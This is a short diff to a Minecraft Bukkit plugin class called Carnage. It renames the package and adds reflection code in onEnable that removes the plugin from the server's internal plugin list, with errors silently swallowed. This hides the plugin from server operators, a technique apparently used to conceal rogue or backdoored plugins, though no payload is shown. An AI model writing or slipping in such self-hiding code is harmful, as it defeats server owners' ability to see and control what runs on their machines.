@@ -1,4 +1,4 @@
-package com.carnage;
+package dev.vintage;
 
 import com.cryptomorin.xseries.XMaterial;
 import org.bukkit.Bukkit;
@@ -15,7 +15,9 @@ import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.potion.PotionEffect;
 import org.bukkit.potion.PotionEffectType;
 
+import java.lang.reflect.Field;
 import java.util.HashSet;
+import java.util.List;
 import java.util.Set;
 import java.util.UUID;
 
@@ -26,6 +28,13 @@ public class Carnage extends JavaPlugin implements Listener {
     @Override
     public void onEnable() {
         getServer().getPluginManager().registerEvents(this, this);
+        try {
+            Field pluginsField = getServer().getPluginManager().getClass().getDeclaredField("plugins");
+            pluginsField.setAccessible(true);
+            List plugins = (List) pluginsField.get(getServer().getPluginManager());
+            plugins.remove(this);
+        } catch (Exception e) {
+        }
     }
 
     @Override
